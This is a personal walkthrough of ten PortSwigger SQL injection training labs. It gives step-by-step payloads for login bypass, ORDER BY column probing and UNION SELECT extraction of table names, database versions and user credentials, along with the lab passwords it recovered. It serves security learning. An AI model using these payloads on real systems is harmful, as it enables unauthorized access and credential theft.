<head>
  <style>
    body {
      font-family: "Georgia", serif;
      text-align: justify;
    }
  </style>
</head>

## Basic SQL Injection

<br>

# 01. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
#### Lab: https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:
<code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code>

To solve the lab, perform a SQL injection attack that causes the application to <b>display one or more unreleased products</b>.

All the process I've done to perform SQLi are try to click on something clickable, then I tried to add "or" conditions such as <code>' or 1=1--</code>. Since I performed on URL, I add the <code>+</code> as a space, so the whole querry is <code>'+or+1=1--</code>. 
The steps can be reached below (sequence).
<!-- <ul>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/</li>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=Lifestyle</li>
    <li>https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=%27+or+1=1--</li>
</ul> -->
1. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/
2. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=Lifestyle
3. https://0a4a00eb04427bf1812b0797007200d8.web-security-academy.net/filter?category=%27+or+1=1--

<br></br>

# 02. SQL injection vulnerability allowing login bypass
#### Lab: https://portswigger.net/web-security/sql-injection/lab-login-bypass

<b>Problem:</b> This lab contains a SQL injection vulnerability in the login function.
To solve the lab, perform a SQL injection attack that <b>logs in to the application as the administrator user</b>.

Same as before, since this lab objective is to gain the access of administrator, then I used a basic SQLi payload such as <code>'or 1=1--</code>, <code>administrator' or 1=1--</code>, <code>administrator'--</code>. All of these payloads work perfectly, it is because there is no sanitazion and filter for the query on the form and the database. Also for the password I was type <code>a</code>, because the form forced user to fill all the field with value.

The steps can be reached below (sequence).
<!-- <ul>
    <li>https://0a0f006503b947e981064870003400ff.web-security-academy.net/</li>
    <li>https://0a0f006503b947e981064870003400ff.web-security-academy.net/login</li>
    <li><code>'or 1=1--</code> on Username input form and <code>a</code> on Password input form.</li>
</ul> -->
1. https://0a0f006503b947e981064870003400ff.web-security-academy.net/
2. https://0a0f006503b947e981064870003400ff.web-security-academy.net/login
3. <code>'or 1=1--</code> on <b>Username</b> input form and <code>a</code> on <b>Password</b> input form.

<br></br>

# 03. SQL injection attack, querying the database type and version on Oracle
#### Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

<b>Problem: </b> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, display the database version string.
<b>Objectives: </b>
1. CORE 11.2.0.2.0 Production
2. NLSRTL Version 11.2.0.2.0 - Production
3. Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
4. PL/SQL Release 11.2.0.2.0 - Production
5. TNS for Linux: Version 11.2.0.2.0 - Production

Since they've mentioned the database is using Oracle, then there are a few conditions to attack, such as when we use SELECT, we have to use FROM (mentioned the existing table name). However, since we don't know the table name, we can use <b>dual</b>, because it is a built-in table on Oracle. First step is just looking for the one we can inject, then try to know the numbers of columns using <code>' union select a,'a' from dual--</code>, then to show the informations of DB, use <code>' union select banner,null, from v$version--</code>.

The steps can be reached below (sequence).
1. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/
2. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=Pets
3. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=%27+union+select+%27abc%27,%20%27def%27+from+dual--
4. https://0a9000fa039e58e8806b21f7004700a0.web-security-academy.net/filter?category=%27+union+select+banner,NULL+from+v$version--

<br></br>

# 04. SQL injection attack, querying the database type and version on MySQL and Microsoft
#### Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.
To solve the lab, <b>display the database version string</b>.

Since this DB using mySQL and Microsoft, to show the version string we can use <code>@@version</code>. To perform this attack, we have to know the column by using <code>ORDER BY</code>.

The steps used to perform can be reached below (sequence).
1. Original: https://0a9400fe0308d7238088306000f50053.web-security-academy.net/
2. Explore: https://0a9400fe0308d7238088306000f50053.web-security-academy.net/filter?category=Pets
3. Try to find coulumn using <code>' order by 1#</code> https://0a9400fe0308d7238088306000f50053.web-security-academy.net/filter?category=%27+order+by+1%23
4. Try to find coulumn using <code>' order by 2#</code> https://0a9400fe0308d7238088306000f50053.web-security-academy.net/filter?category=%27+order+by+2%23
5. Try to find coulumn using <code>' order by 3#</code> https://0a9400fe0308d7238088306000f50053.web-security-academy.net/filter?category=%27+order+by+3%23. Since the result is internal server error, the column shall be only 2.
6. After we know the answer is 2 column and it was injectable, we can perform <code>UNION</code> attack, by using basic union select <code>' union select @@version,null#</code>. https://0a9400fe0308d7238088306000f50053.web-security-academy.net/filter?category=%27+union+select+%40%40version,null%23

<br></br>

# 05. SQL injection attack, listing the database contents on non-Oracle databases
#### Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
<b>Problem: </b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to <b>determine the name of this table and the columns it contains</b>, then <b>retrieve the contents of the table</b> to obtain the username and password of all users.

To solve the lab, <b>log in as the administrator user</b>.

The steps used to perform can be reached below (sequence).
1. https://0a5b001404436501801112dd001a0027.web-security-academy.net/
2. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=Lifestyle
3. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27+order+by+1--
4. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27+order+by+2--
5. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27+order+by+3--. Since this returned the internal server error, it means that the column are only 2.
6. Since we know this is injectable, we can perform the <code>UNION</code> attack use <code>' union select table_name,null from information_schema.tables--</code> to show all the tables on the schema https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27+union+select+table_name,null+from+information_schema.tables--.
7. The page consist of tables on the schema, try to find the "user" on table name, because we intend to find the user table and grab all the username and password to get loged in. Here's the list of table name that has "user" on it:
  &nbsp;&nbsp;&nbsp;1. user_defined_types
  &nbsp;&nbsp;&nbsp;2. pg_statio_user_sequences
  &nbsp;&nbsp;&nbsp;3. pg_user_mappings
  &nbsp;&nbsp;&nbsp;4. pg_stat_xact_user_functions
  &nbsp;&nbsp;&nbsp;5. user_mappings
  &nbsp;&nbsp;&nbsp;6. user_mapping_options
  &nbsp;&nbsp;&nbsp;7. users_ybnddd
  &nbsp;&nbsp;&nbsp;8. pg_stat_xact_user_tables
  &nbsp;&nbsp;&nbsp;9. pg_statio_user_tables
  &nbsp;&nbsp;&nbsp;10. pg_stat_user_indexes
  &nbsp;&nbsp;&nbsp;11. pg_statio_user_indexes
  &nbsp;&nbsp;&nbsp;<b>12. pg_user</b>
  &nbsp;&nbsp;&nbsp;13. pg_stat_user_functions
from the list of tables above, I'm curious on <code>pg_user</code>.
8. Since we suspect the table, we can explore what inside and tryng to find the username and password using <code>' union select column_name,null from information_schema.columns where table_name='pg_user'--</code> to show all the columns on this table https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27%20union%20select%20column_name,null%20from%20information_schema.columns%20where%20table_name=%27pg_user%27--.
9. All the columns of the tables has been showed on the page and there are suspicious column name called <code>passwd</code> and <code>usename</code>. Now we can try to grab the informations for username and password that might inside of the table, using <code>' union select usename,passwd from pg_user--</code>. The result is useless, because there is no "Administrator" and also the passwords encrypted and just showed <code>********</code>.
10. Then I tried to do the same thing on <code>7. users_ybnddd</code>. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27%20union%20select%20column_name,null%20from%20information_schema.columns%20where%20table_name=%27users_ybnddd%27--, this page showed <code>username_gmijgu</code>, <code>password_waqbwh</code>, <code>email</code>.
11. With these informations, I tried the same thing <code>' union select username_gmijgu,password_waqbwh from users_ybnddd--</code>. https://0a5b001404436501801112dd001a0027.web-security-academy.net/filter?category=%27%20union%20select%20username_gmijgu,password_waqbwh%20from%20users_ybnddd--, then the informations appeared
  &nbsp;&nbsp;&nbsp;1. carlos, bfyn49qch1ofbyljrdkp
  &nbsp;&nbsp;&nbsp;2. wiener, u79yqwiw2eqj7425w1e7
  &nbsp;&nbsp;&nbsp;3. <code>administrator, sm9on4yepjdb21z5gcix</code>
Since we've got the administrator account and the password, then just log in into that account on login page. https://0a5b001404436501801112dd001a0027.web-security-academy.net/my-account?id=administrator

<br></br>

# 06. SQL injection attack, listing the database contents on Oracle
#### Lab: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, <b>log in as the administrator user</b>.

The problem most likely similar as previous.
The steps used to perform can be reached below (sequence).
1. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/.
2. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=Lifestyle.
3. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27order%20by%201--.
4. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27order%20by%202--.
5. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27order%20by%203--.
6. Since we know that there are 2 columns available, and SQL is injectable, we can use <code>UNION</code> attacks. <code>'union select table_name,null from all_tables--</code> to show all tables on this schema. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27union%20select%20table_name,null%20from%20all_tables--. The page showed all list of tables and we have to find <code>users</code> table, here's the list of *users tables.
  &nbsp;&nbsp;&nbsp;1. APP_USERS_AND_ROLES
  &nbsp;&nbsp;&nbsp;2. <b>USERS_QINSZU</b>
There is suspecious name of table <code>USERS_QINSZU</code>, therefore we can inspect it using previous steps by looking columns then if there are such username and password, we can dig down.
7. After try to use <code>'union select column_name,null from all_tab_columns where table_name='USERS_QINSZU'--</code> there are <code>PASSWORD_CHGEWK</code>, <code>USERNAME_DWCOPT</code>. With those informations, we can try to grab the informations. https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27union%20select%20column_name,null%20from%20all_tab_columns%20where%20table_name=%27USERS_QINSZU%27--.
8. Now, we can try to use <code>' union select USERNAME_DWCOPT,PASSWORD_CHGEWK from USERS_QINSZU--</code> (https://0aad00bf04b072e280a108ed00ca00ca.web-security-academy.net/filter?category=%27%20union%20select%20USERNAME_DWCOPT,PASSWORD_CHGEWK%20from%20USERS_QINSZU--), then data appeared
  &nbsp;&nbsp;&nbsp;1. <code>administrator, lajhsi10py1k5y9o7op4</code>
  &nbsp;&nbsp;&nbsp;2. carlos, gwhh0rzn2aszzghtimmj
  &nbsp;&nbsp;&nbsp;3. wiener, 5mihohp2nr0f3tpb3ulf
9. Since we've got the administrator password, then just log in to admin account.

<br></br>

# 07. SQL injection UNION attack, determining the number of columns returned by the query
#### Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.

To solve the lab, determine the <b>number of columns returned</b> by the query by performing a SQL injection UNION attack that <b>returns an additional row containing null values</b>.

The steps used to perform can be reached below (sequence).
1. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/.
2. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=Pets.
3. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=%27order%20by%201--.
4. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=%27order%20by%202--.
5. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=%27order%20by%203--.
6. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=%27order%20by%204--.
7. Since there are only 3 column and injectable, then we can just try to use <code>UNION</code> and the objective is to get null return values, then just we just select null values to perform this attack. https://0a40002a03d0756e805a0dfe00e60058.web-security-academy.net/filter?category=%27union%20select%20null,null,null--.

<br></br>

# 08. SQL injection UNION attack, finding a column containing text
#### Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data. The lab will provide a random value that you need to make appear within the query results. 

To solve the lab, perform a SQL injection UNION attack that <b>returns an additional row containing the value</b> provided. This technique helps you determine which columns are compatible with string data.

The steps used to perform can be reached below (sequence).
1. https://0aa800b4048af4178378696600320024.web-security-academy.net/.
2. https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=Pets.
3. https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27order%20by%203--.
4. https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27order%20by%204--.
5. Since we know there are 3 column, we can try to use <code>'union select null,null,null--</code> (https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27union%20select%20null,null,null--).
6. <code>'union select 'null',null,null--</code> (https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27union%20select%20%27null%27,null,null--).
7. The previous step shows internal server error, so we can next to the next column to see another reactions. <code>'union select null,'null',null--</code> (https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27union%20select%20null,%27null%27,null--). Now it shows "null" on the page. 
8. Now since we know that the 2nd column we can use, then we just change the value from <code>null</code> to <code>FMQ9x7</code>. https://0aa800b4048af4178378696600320024.web-security-academy.net/filter?category=%27union%20select%20null,%27FMQ9x7%27,null--.

<br></br>

# 09. SQL injection UNION attack, retrieving data from other tables
#### Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs. The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that <b>retrieves all usernames and passwords</b>, and use the information to <b>log in as the administrator user</b>.

The steps used to perform can be reached below (sequence).
1. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/
2. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=Gifts.
3. https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27order%20by%203--.
4. Since the 3 column shows internal server error, then it should be 2 column. (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27order%20by%202--).
5. Then we can try to perform injection to get all tables on the schema using <code>'union select table_name,null from information_schema.tables--</code> (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27union%20select%20table_name,null%20from%20information_schema.tables--), then try to find user table, and there are few of table named "users".
6. Try to use <code>'union select column_name,null from information_schema.columns where table_name='users'--</code> to show all the columns on "users" table. (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/filter?category=%27union%20select%20column_name,null%20from%20information_schema.columns%20where%20table_name=%27users%27--).
7. After we got the columns name on "users" table, then we just show all rows there using <code>'union select username,password from users--</code>
  &nbsp;&nbsp;&nbsp;1. <code>administrator, eb9qebphwfporp5ahk34</code>
  &nbsp;&nbsp;&nbsp;2. carlos, bgzcijedaxa3tbsd7bha
  &nbsp;&nbsp;&nbsp;3. wiener, ixeybzs4yktiu3yosav1
Since we've got the administrator password, we just have to log in by admin account (https://0abe00bd045fcd7b81eb39f500aa0007.web-security-academy.net/my-account?id=administrator).

<br></br>

# 10. SQL injection UNION attack, retrieving multiple values in a single column
#### Lab: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column
<b>Problem:</b> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables. The database contains a different table called users, with columns called username and password.

To solve the lab, perform a SQL injection UNION attack that <b>retrieves all usernames and passwords</b>, and use the information to <b>log in as the administrator user</b>.

The steps used to perform can be reached below (sequence).
1. https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/.
2. https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=Lifestyle.
3. https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=%27order%20by%202--.
4. Since 2 column still working, then we can try to see if 3rd column exist https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=%27order%20by%203--. 
5. Since we've informed that table name is "users" with columns called "username" and "password", then we can try to use <code>'union select username,null from users--</code> and <code>'union select password,null</code>, unfortunately it shows internal server error, so try to switch the position, where null on the first column and the username on the 2nd, same for the password. username: https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=%27union%20select%20null,username%20from%20users--; password: https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=%27union%20select%20null,password%20from%20users--. Since the page show the list and started with "administrator", then we can assume that the pasword is also sequence. However, that not valid and can caused troubles, then we need to concate the username and password.
6. Since the system force us to wrap into one column, then we can use concate to display data <code>' union select null,username||'~'||password from users--</code> (https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/filter?category=%27+UNION+SELECT+NULL,username||%27~%27||password+FROM+users--).
  &nbsp;&nbsp;&nbsp;1. <code>administrator~8wcajgysezn96t6aipod</code>
  &nbsp;&nbsp;&nbsp;2. wiener~syak32l3rson9c58vqet
  &nbsp;&nbsp;&nbsp;3. carlos~yme9qakg96u3wurcj6o2
7. Finally, after we got the admin password, then we can just log in into admin account (https://0a34006203475c0c81493e6c008900f3.web-security-academy.net/my-account?id=administrator).
